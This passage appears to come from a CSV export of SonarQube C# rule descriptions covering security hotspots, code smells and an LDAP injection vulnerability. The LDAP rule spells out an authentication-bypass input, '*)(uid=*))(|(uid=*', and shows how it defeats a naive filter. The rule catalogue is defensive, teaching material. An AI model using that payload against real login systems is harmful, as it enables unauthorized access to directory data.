  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.In; // Questionable
        var code = Console.Read(); // Questionable
        var keyInfo = Console.ReadKey(...); // Questionable
        var text = Console.ReadLine(); // Questionable
        Console.OpenStandardInput(...); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.ReadKey(...); // Return value is ignored
        Console.ReadLine(); // Return value is ignored
    }
}
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This code flags all program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide security code
reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<pre>
namespace MyNamespace
{
    class Program
    {
        static void Main(string[] args) // Questionable if there is a reference to ""args"" in the method.
        {
            string myarg = args[0];
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",csharpsquid:S4823,cs,C#,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This code flags all program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide security code
reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<pre>
namespace MyNamespace
{
    class Program
    {
        static void Main(string[] args) // Questionable if there is a reference to ""args"" in the method.
        {
            string myarg = args[0];
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
System.Net.Http.HttpClient client;
// All the following are Questionable
client.GetAsync(...);
client.GetByteArrayAsync(...);
client.GetStreamAsync(...);
client.GetStringAsync(...);
client.SendAsync(...);
client.PostAsync(...);
client.PutAsync(...);
client.DeleteAsync(...);


System.Net.WebClient webclient;
// All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
webclient.Download*(...); // Any method starting with ""Download""
webclient.Open*(...); // Any method starting with ""Open""
webclient.Upload*(...); // Any method starting with ""Upload""

// All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
System.Net.WebRequest.Create(...);
System.Net.WebRequest.CreateDefault(...);

// The following is always Questionable
System.Net.WebRequest.CreateHttp(...);

// === RestSharp ===
// Questionable, as well as any other instantiation of the RestSharp.IRestRequest interface.
new RestSharp.RestRequest(...);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",csharpsquid:S4825,cs,C#,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
System.Net.Http.HttpClient client;
// All the following are Questionable
client.GetAsync(...);
client.GetByteArrayAsync(...);
client.GetStreamAsync(...);
client.GetStringAsync(...);
client.SendAsync(...);
client.PostAsync(...);
client.PutAsync(...);
client.DeleteAsync(...);


System.Net.WebClient webclient;
// All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
webclient.Download*(...); // Any method starting with ""Download""
webclient.Open*(...); // Any method starting with ""Open""
webclient.Upload*(...); // Any method starting with ""Upload""

// All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
System.Net.WebRequest.Create(...);
System.Net.WebRequest.CreateDefault(...);

// The following is always Questionable
System.Net.WebRequest.CreateHttp(...);

// === RestSharp ===
// Questionable, as well as any other instantiation of the RestSharp.IRestRequest interface.
new RestSharp.RestRequest(...);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Sending HTTP requests is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.Threading;
using System.Security.Permissions;
using System.Security.Principal;
using System.IdentityModel.Tokens;

class SecurityPrincipalDemo
{
    class MyIdentity : IIdentity // Questionable, custom IIdentity implementations should be reviewed
    {
        // ...
    }

    class MyPrincipal : IPrincipal // Questionable, custom IPrincipal implementations should be reviewed
    {
        // ...
    }
    [System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role = ""Administrators"")] // Questionable. The access restrictions enforced by this attribute should be reviewed.
    static void CheckAdministrator()
    {
        WindowsIdentity MyIdentity = WindowsIdentity.GetCurrent(); // Questionable
        HttpContext.User = ...; // Questionable: review all reference (set and get) to System.Web HttpContext.User
        AppDomain domain = AppDomain.CurrentDomain;
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal); // Questionable
        MyIdentity identity = new MyIdentity(); // Questionable
        MyPrincipal MyPrincipal = new MyPrincipal(MyIdentity); // Questionable
        Thread.CurrentPrincipal = MyPrincipal; // Questionable
        domain.SetThreadPrincipal(MyPrincipal); // Questionable

        // All instantiation of PrincipalPermission should be reviewed.
        PrincipalPermission principalPerm = new PrincipalPermission(null, ""Administrators""); // Questionable
        principalPerm.Demand();

        SecurityTokenHandler handler = ...;
        // Questionable: this creates an identity.
        ReadOnlyCollection&lt;ClaimsIdentity&gt; identities = handler.ValidateToken(Ã¢â‚¬Â¦);
    }

     // Questionable: review how this function uses the identity and principal.
    void modifyPrincipal(MyIdentity identity, MyPrincipal principal)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4834,cs,C#,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.Threading;
using System.Security.Permissions;
using System.Security.Principal;
using System.IdentityModel.Tokens;

class SecurityPrincipalDemo
{
    class MyIdentity : IIdentity // Questionable, custom IIdentity implementations should be reviewed
    {
        // ...
    }

    class MyPrincipal : IPrincipal // Questionable, custom IPrincipal implementations should be reviewed
    {
        // ...
    }
    [System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role = ""Administrators"")] // Questionable. The access restrictions enforced by this attribute should be reviewed.
    static void CheckAdministrator()
    {
        WindowsIdentity MyIdentity = WindowsIdentity.GetCurrent(); // Questionable
        HttpContext.User = ...; // Questionable: review all reference (set and get) to System.Web HttpContext.User
        AppDomain domain = AppDomain.CurrentDomain;
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal); // Questionable
        MyIdentity identity = new MyIdentity(); // Questionable
        MyPrincipal MyPrincipal = new MyPrincipal(MyIdentity); // Questionable
        Thread.CurrentPrincipal = MyPrincipal; // Questionable
        domain.SetThreadPrincipal(MyPrincipal); // Questionable

        // All instantiation of PrincipalPermission should be reviewed.
        PrincipalPermission principalPerm = new PrincipalPermission(null, ""Administrators""); // Questionable
        principalPerm.Demand();

        SecurityTokenHandler handler = ...;
        // Questionable: this creates an identity.
        ReadOnlyCollection&lt;ClaimsIdentity&gt; identities = handler.ValidateToken(Ã¢â‚¬Â¦);
    }

     // Questionable: review how this function uses the identity and principal.
    void modifyPrincipal(MyIdentity identity, MyPrincipal principal)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Controlling permissions is security-sensitive,[],CRITICAL,"['owasp-a5', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-07-18T12:33:17+0200,"<p>When multiple, adjacent <code>try</code> statements have duplicate <code>catch</code> and/or <code>finally</code> blocks, they should be merged to
consolidate the <code>catch/finally</code> logic for cleaner, more readable code. Note that this applies even when there is intervening code outside
any <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

DoSomeOtherStuff();

try  // Noncompliant; catch is identical to previous
{
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
  DoSomeOtherStuff();
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>",csharpsquid:S2327,cs,C#,"<p>When multiple, adjacent <code>try</code> statements have duplicate <code>catch</code> and/or <code>finally</code> blocks, they should be merged to
consolidate the <code>catch/finally</code> logic for cleaner, more readable code. Note that this applies even when there is intervening code outside
any <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

DoSomeOtherStuff();

try  // Noncompliant; catch is identical to previous
{
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{
  DoTheFirstThing(a, b);
  DoSomeOtherStuff();
  DoTheSecondThing();
}
catch (InvalidOperationException ex)
{
  HandleException(ex);
}

try  // Compliant; catch handles exception differently
{
  DoTheThirdThing(a);
}
catch (InvalidOperationException ex)
{
  LogAndDie(ex);
}
</pre>","""try"" statements with identical ""catch"" and/or ""finally"" blocks should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2018-07-18T12:33:17+0200,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
list[index] = ""value 1"";
list[index] = ""value 2"";  // Noncompliant

dictionary.Add(key, ""value 1"");
dictionary[key] = ""value 2""; // Noncompliant
</pre>",csharpsquid:S4143,cs,C#,"<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
list[index] = ""value 1"";
list[index] = ""value 2"";  // Noncompliant

dictionary.Add(key, ""value 1"");
dictionary[key] = ""value 2""; // Noncompliant
</pre>",Collection elements should not be replaced unconditionally,[],MAJOR,['suspicious'],BUG
2018-06-18T12:48:48+0200,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class LDAPInjection : Controller
{
  public DirectorySearcher ds { get; set; }

  // GET /LDAPInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    ds.Filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Noncompliant

    // If the special value ""*)(uid=*))(|(uid=*"" is passed as user, authentication is bypassed
    // Indeed, if it is passed as a user, the filter becomes:
    // (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=...))
    // as uid=* match all users, it is equivalent to:
    // (|(uid=*)(userPassword=...))
    // again, as uid=* match all users, the filter becomes useless

    return Content(ds.FindOne() != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class LDAPInjection : Controller
{
  public DirectorySearcher ds { get; set; }

  // GET /LDAPInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    // Restrict the username and password to letters only
    if (!Regex.IsMatch(user, ""^[a-zA-Z]+$"") || !Regex.IsMatch(pass, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    ds.Filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Now safe
    return Content(ds.FindOne() != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",roslyn.sonaranalyzer.security.cs:S2078,cs,C#,"<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing LDAP names or search filters directly
from tainted data enables attackers to inject specially crafted values that changes the initial meaning of the name or filter itself. Successful LDAP
injections attacks can read, modify or delete sensitive information from the directory service.</p>
<p>Within LDAP names, the special characters <code>' '</code>, <code>'#'</code>, <code>'""'</code>, <code>'+'</code>, <code>','</code>,
<code>';'</code>, <code>'&lt;'</code>, <code>'&gt;'</code>, <code>'\'</code> and <code>null</code> must be escaped according to RFC 4514, for example
by replacing them with the backslash character <code>'\'</code> followed by the two hex digits corresponding to the ASCII code of the character to be
escaped. Similarly, LDAP search filters must escape a different set of special characters (including but not limited to <code>'*'</code>,
<code>'('</code>, <code>')'</code>, <code>'\'</code> and <code>null</code>) according to RFC 4515.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class LDAPInjection : Controller
{
  public DirectorySearcher ds { get; set; }

  // GET /LDAPInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    ds.Filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Noncompliant

    // If the special value ""*)(uid=*))(|(uid=*"" is passed as user, authentication is bypassed
    // Indeed, if it is passed as a user, the filter becomes:
    // (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=...))
    // as uid=* match all users, it is equivalent to:
    // (|(uid=*)(userPassword=...))
    // again, as uid=* match all users, the filter becomes useless

    return Content(ds.FindOne() != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class LDAPInjection : Controller
{
  public DirectorySearcher ds { get; set; }

  // GET /LDAPInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    // Restrict the username and password to letters only
    if (!Regex.IsMatch(user, ""^[a-zA-Z]+$"") || !Regex.IsMatch(pass, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    ds.Filter = ""(&amp;(uid="" + user + "")(userPassword="" + pass + ""))""; // Now safe
    return Content(ds.FindOne() != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.ietf.org/rfc/rfc4514.txt"">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href=""https://www.ietf.org/rfc/rfc4515.txt"">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/90"">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/CgLEAw"">CERT, IDS54-J.</a> - Prevent LDAP injection </li>
</ul>",LDAP queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2017-09-08T12:35:24+0200,"<p>A method is detected as test method if marked with one of the following attributes <code>[TestMethod]</code> or <code>[DataTestMethod]</code> (for
mstest), <code>[Fact]</code> or <code>[Theory]</code> (for xunit) or <code>[Test]</code>, <code>[TestCase]</code>, <code>[TestCaseSource]</code> or
<code>[Theory]</code> (for nunit). However, whether or not they have a test attribute, non-<code>public</code> methods are not recognized as tests,
and therefore not executed. Neither are <code>async</code> <code>void</code> methods, or methods with generics anywhere in their signatures. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
void TestNullArg()  // Noncompliant; method is not public
{  /* ... */  }

[TestMethod]
public async void MyIgnoredTestMethod()  // Noncompliant; this is an 'async void' method
{ /* ... */ }

[TestMethod]
public void MyIgnoredGenericTestMethod&lt;T&gt;(T foo)  // Noncompliant; method has generics in its signature
{ /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
public void TestNullArg()
{  /* ... */  }
</pre>
<h2>Exceptions</h2>
<p>Accessibility is ignored for xUnit <code>Fact</code> test methods, since they do not need to be <code>public</code>.</p>
<p><code>[Theory]</code> test methods in xUnit and <code>[TestCase]</code> and <code>[TestCaseSource]</code> test methods in nunit can be generic.</p>",csharpsquid:S3433,cs,C#,"<p>A method is detected as test method if marked with one of the following attributes <code>[TestMethod]</code> or <code>[DataTestMethod]</code> (for
mstest), <code>[Fact]</code> or <code>[Theory]</code> (for xunit) or <code>[Test]</code>, <code>[TestCase]</code>, <code>[TestCaseSource]</code> or
<code>[Theory]</code> (for nunit). However, whether or not they have a test attribute, non-<code>public</code> methods are not recognized as tests,
and therefore not executed. Neither are <code>async</code> <code>void</code> methods, or methods with generics anywhere in their signatures. </p>
<h2>Noncompliant Code Example</h2>
<pre>
[TestMethod]
void TestNullArg()  // Noncompliant; method is not public
{  /* ... */  }

[TestMethod]
public async void MyIgnoredTestMethod()  // Noncompliant; this is an 'async void' method
{ /* ... */ }

[TestMethod]
public void MyIgnoredGenericTestMethod&lt;T&gt;(T foo)  // Noncompliant; method has generics in its signature
{ /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
[TestMethod]
public void TestNullArg()
{  /* ... */  }
</pre>
<h2>Exceptions</h2>
<p>Accessibility is ignored for xUnit <code>Fact</code> test methods, since they do not need to be <code>public</code>.</p>
<p><code>[Theory]</code> test methods in xUnit and <code>[TestCase]</code> and <code>[TestCaseSource]</code> test methods in nunit can be generic.</p>",Test method signatures should be correct,[],BLOCKER,['tests'],CODE_SMELL
